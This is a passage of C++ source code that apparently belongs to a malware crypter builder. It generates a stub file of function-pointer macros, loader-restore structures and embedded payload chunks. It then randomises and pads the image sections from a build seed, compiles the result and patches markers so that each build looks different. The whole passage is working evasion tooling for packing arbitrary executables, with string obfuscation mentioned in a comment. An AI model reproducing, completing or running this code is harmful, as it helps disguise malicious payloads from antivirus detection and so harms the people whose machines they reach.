			"#define k_GetThreadIOPendingFlag (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadIOPendingFlag)\r\n"
			"#define k_GetThreadPriority (*(DWORD(WINAPI *)(DWORD)) GetThreadPriority)\r\n"
			"#define k_GetThreadPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadPriorityBoost)\r\n"
			"#define k_GetThreadTimes (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetThreadTimes)\r\n"
			"#define k_GetVersion (*(DWORD(WINAPI *)(VOID)) GetVersion)\r\n"
			"#define k_GetWriteWatch (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetWriteWatch)\r\n"
			"#define k_GlobalCompact (*(DWORD(WINAPI *)(DWORD)) GlobalCompact)\r\n"
			"#define k_GlobalDeleteAtom (*(DWORD(WINAPI *)(DWORD)) GlobalDeleteAtom)\r\n"
			"#define k_GlobalUnWire (*(DWORD(WINAPI *)(DWORD)) GlobalUnWire)\r\n"
			"#define k_GlobalUnfix (*(DWORD(WINAPI *)(DWORD)) GlobalUnfix)\r\n"
			"#define k_GlobalUnlock (*(DWORD(WINAPI *)(DWORD)) GlobalUnlock)\r\n"
			"#define k_InitAtomTable (*(DWORD(WINAPI *)(DWORD)) InitAtomTable)\r\n"
			"#define k_IsProcessInJob (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) IsProcessInJob)\r\n"
			"#define k_IsWow64Process (*(DWORD(WINAPI *)(DWORD,DWORD)) IsWow64Process)\r\n"
			"#define k_LocalCompact (*(DWORD(WINAPI *)(DWORD)) LocalCompact)\r\n"
			"#define k_LocalShrink (*(DWORD(WINAPI *)(DWORD,DWORD)) LocalShrink)\r\n"
			"#define k_LocalUnlock (*(DWORD(WINAPI *)(DWORD)) LocalUnlock)\r\n"
			"#define k_LockResource (*(DWORD(WINAPI *)(DWORD)) LockResource)\r\n"
			"#define k_MapUserPhysicalPagesScatter (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) MapUserPhysicalPagesScatter)\r\n"
			"#define k_MulDiv (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) MulDiv)\r\n"
			"#define k_OpenProcess (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) OpenProcess)\r\n"
			"#define k_PeekNamedPipe (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) PeekNamedPipe)\r\n"
			"#define k_PostQueuedCompletionStatus (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) PostQueuedCompletionStatus)\r\n"
			"#define k_PrepareTape (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) PrepareTape)\r\n"
			"#define k_PulseEvent (*(DWORD(WINAPI *)(DWORD)) PulseEvent)\r\n"
			"#define k_ReleaseMutex (*(DWORD(WINAPI *)(DWORD)) ReleaseMutex)\r\n"
			"#define k_ReleaseSemaphore (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) ReleaseSemaphore)\r\n"
			"#define k_ResetEvent (*(DWORD(WINAPI *)(DWORD)) ResetEvent)\r\n"
			"#define k_ResetWriteWatch (*(DWORD(WINAPI *)(DWORD,DWORD)) ResetWriteWatch)\r\n"
			"#define k_SetHandleCount (*(DWORD(WINAPI *)(DWORD)) SetHandleCount)\r\n"
			"#define k_SetHandleInformation (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) SetHandleInformation)\r\n"
			"#define k_SetInformationJobObject (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) SetInformationJobObject)\r\n"
			"#define k_SetLastError (*(DWORD(WINAPI *)(DWORD)) SetLastError)\r\n"
			"#define k_SetMailslotInfo (*(DWORD(WINAPI *)(DWORD,DWORD)) SetMailslotInfo)\r\n"
			"#define k_SetMessageWaitingIndicator (*(DWORD(WINAPI *)(DWORD,DWORD)) SetMessageWaitingIndicator)\r\n"
			"#define k_SetPriorityClass (*(DWORD(WINAPI *)(DWORD,DWORD)) SetPriorityClass)\r\n"
			"#define k_SetProcessPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) SetProcessPriorityBoost)\r\n"
			"#define k_SetProcessWorkingSetSize (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) SetProcessWorkingSetSize)\r\n"
			"#define k_SetStdHandle (*(DWORD(WINAPI *)(DWORD,DWORD)) SetStdHandle)\r\n"
			"#define k_SetSystemTimeAdjustment (*(DWORD(WINAPI *)(DWORD,DWORD)) SetSystemTimeAdjustment)\r\n"
			"#define k_TransmitCommChar (*(DWORD(WINAPI *)(DWORD,DWORD)) TransmitCommChar)\r\n"
			"\r\n"
				"typedef size_t(*QaPsafe_depack)(const void* source, size_t srclen, void* destination, size_t dstlen);\r\n"
				"#define BUFFER_SIZE 0x2000\r\n"
				"\r\n";

		stub << "\r\n";
		
		// some times i forgot to see seed in msvc output 
		CHAR str_seed[50];
		wsprintfA(str_seed, "// Build seed: 0x%0.8X %0.8X\r\n", (DWORD)(random.get_seed() >> 32), (DWORD)random.get_seed(), (DWORD)random.get_seed());
		stub << str_seed;

		stub << 
			"//=============================================================\r\n"
			"//= Some crypt system defines and structures\r\n"
			"//=============================================================\r\n"
			"#pragma pack(push,1)\r\n"
			"typedef struct _LDR_RESTORE_PARAMS\r\n"
			"{\r\n"
			"	PBYTE	orig_data;\r\n"
			"	PBYTE	entr_data;\r\n"
			"	DWORD_PTR base;\r\n"
			"	DWORD_PTR ret_func;\r\n"
			"}LDR_RESTORE_PARAMS, *PLDR_RESTORE_PARAMS;\r\n"
			"#pragma pack(pop)\r\n"
			"typedef void (WINAPI *TD_ldr_restore)(PLDR_RESTORE_PARAMS);\r\n"
			"typedef HANDLE (WINAPI *TD_HeapCreate)(DWORD flOptions,DWORD dwInitialSize,DWORD dwMaximumSize);\r\n";


		/*
			0 - text before
			1 - text after
			2 - data
			3 - rdata
		*/

		if( payload.get_chunk(PAYLOAD_CHUNK_TEXT1) )
		{
			stub << "extern \"C\" void WINAPI payload_0();\r\n";
		}

		if( payload.get_chunk(PAYLOAD_CHUNK_TEXT2) )
		{
			stub << "extern \"C\" void WINAPI payload_1();\r\n";
		}

		if( image_size==0 )
		{
			mCode asm_file(0xFFFF);

			if( (chunk = payload.get_chunk(PAYLOAD_CHUNK_TEXT1)) )
			{
				asm_file.clear();

				if( orig_nt->FileHeader.Machine==IMAGE_FILE_MACHINE_I386 )
				{
					asm_file << ".586\r\n";
					asm_file << ".model flat,stdcall\r\n";
				}

				asm_file << "option casemap:none\r\n";
				asm_file << "option prologue:none\r\n";
				asm_file << "option epilogue:none\r\n";
				asm_file << ".code\r\n\r\npayload_0 proc\r\n";
				asm_file << "; entr_size = " << chunk->entr_size << ", orig_size = " << chunk->orig_size << "\r\n";

				payload.get_string(asm_file, PST_ASM, 0);

				asm_file << "payload_0 endp\r\nend\r\n";

				path_builder.add_file("payload_0.asm", asm_file.get(), asm_file.length());
				compiler.add_asm_file("payload_0.asm");
			}

			compiler.add_main_cpp();
			compiler.add_file("GetApi.cpp");

			if( (chunk = payload.get_chunk(PAYLOAD_CHUNK_TEXT2)) )
			{
				asm_file.clear();

				if( orig_nt->FileHeader.Machine==IMAGE_FILE_MACHINE_I386 )
				{
					asm_file << ".586\r\n";
					asm_file << ".model flat,stdcall\r\n";
				}

				asm_file << "option casemap:none\r\n";
				asm_file << "option prologue:none\r\n";
				asm_file << "option epilogue:none\r\n";
				asm_file << ".code\r\n\r\npayload_1 proc\r\n";
				asm_file << "; entr_size = " << chunk->entr_size << ", orig_size = " << chunk->orig_size << "\r\n";

				payload.get_string(asm_file, PST_ASM, 1);

				asm_file << "payload_1 endp\r\nend\r\n";

				path_builder.add_file("payload_1.asm", asm_file.get(), asm_file.length());
				compiler.add_asm_file("payload_1.asm");
			}
		}

		if( payload.get_chunk(PAYLOAD_CHUNK_DATA) )
		{
			stub << "BYTE payload_2[] = {\r\n";
			payload.get_string(stub, PST_CPP, 2);
			stub << "};\r\n";
		}

		if( payload.get_chunk(PAYLOAD_CHUNK_RDATA) )
		{
			stub << "const BYTE payload_3[] = {\r\n";
			payload.get_string(stub, PST_CPP, 3);
			stub << "};\r\n";
		}
		
		stub << "\r\n";

		// not first call
		if( image_size > 0 )
		{
			// need_size + extend data
			total_size = (orig_nt->OptionalHeader.SizeOfImage - image_size) + random.get_equal(config.image.extend.min,config.image.extend.max);

			// calculate total_size for .data, .rdata sections
			// extend image
			if( !config.image.rdata )
			{
				data_size += ALIGN_UP(total_size, 0x1000);
			}else if( !config.image.data )
			{
				rdata_size += ALIGN_UP(total_size, 0x1000);
			}else{
				DWORD new_rdata_size = (total_size * config.image.rdata) / 100;
				DWORD new_data_size  = total_size - new_rdata_size;

				rdata_size += ALIGN_UP(new_rdata_size,0x1000);
				data_size  += ALIGN_UP(new_data_size,0x1000);
			}
		}else{
			if( globals.length() )
			{
				data_pos  = random.get_less(0,globals.length());
				rdata_pos = random.get_less(0,globals.length());
			}else{
				data_pos = 0;
				rdata_pos = 0;
			}
		}

		if( image_size > 0 && !extend_vars_added )
		{
			//lines.add("PBYTE pdata_extend = data_extend;\r\n");
			//lines.add("PBYTE prdata_extend = (PBYTE)rdata_extend;\r\n");

			extend_vars_added = true;
		}

		if( !globals.length() )
		{
			if( image_size > 0 )
			{
				stub << "const BYTE rdata_extend[" << rdata_size << "] = {0};\r\n";
				stub << "BYTE data_extend[" << data_size << "];\r\n";
			}
		}else{
			MVAR_INFO* var = globals.first();
			for(int i = 0; var ; i++ )
			{
				if( i==rdata_pos && image_size > 0 )
				{
					stub << "const BYTE rdata_extend[" << rdata_size << "] = {0};\r\n";
				}

				if( i==data_pos && image_size > 0 )
				{
					stub << "BYTE data_extend[" << data_size << "];\r\n";
				}

				stub << var->string << ";\r\n";

				var = globals.next();
			}
		}

		for(int i = 0; i < all_functions.get_count(); i++)
		{
			mFunction* func = all_functions.get_value(i);

			if( !lstrcmpA(func->get_name(), "DllMain") || !lstrcmpA(func->get_name(), "WinMain")
				|| !lstrcmpA(func->get_name(), "wWinMain"))
				continue;

			func->get_prototype_string(stub);
		}

		for(int i = 0; i < all_functions.get_count(); i++)
		{
			all_functions.get_value(i)->get_string(stub);
		}
		
		_tprintf(_T("Building...\n"));
		dbg_tset();

		CHAR main_cpp_path[MAX_PATH];

		lstrcpyA(main_cpp_path, path_builder.get_tmp_folder());
		lstrcatA(main_cpp_path, "main.cpp");

		file_put_contentsA(main_cpp_path, stub.get(), stub.length());

		auto _stubSymbols = load_resource(IDR_STUB_SYMBOLS);

		if (!_stubSymbols) {
			_tprintf(_T("Error, can't create symbols.h\r\n"));

			return;
		}

		CHAR _symbols_h_path[MAX_PATH] = {};
		lstrcpyA(_symbols_h_path, path_builder.get_tmp_folder());
		lstrcatA(_symbols_h_path, "symbols.h");

		file_put_contentsA(_symbols_h_path, _stubSymbols->data, _stubSymbols->size);


#ifdef _DEBUG
		file_put_contentsA("e:\\Projects\\test_crypt\\test_crypt\\main.cpp", stub.get(), stub.length());
#endif

		// We need to optimize our stub for string obfuscation
		//compiler.set_advanced_flags("/Og /GF /Ob1");

		// create bat file and build application
		if( (image_size = compiler.build(arg_out))==-1 )
		{
#ifdef _DEBUG
			__debugbreak();
#endif
			return;
		}

		_tprintf(_T("Build time: %d sec\n"), dbg_tget());
	}

	if (patcher.patch_markers()) {
		_tprintf(_T("Patched successfully\r\n"));
	}

	_tprintf(_T("SUCCESS: Build created.\r\n"));

	path_builder.remove_tmp_folder();

	mem_free(idata);

	ExitProcess(0);
}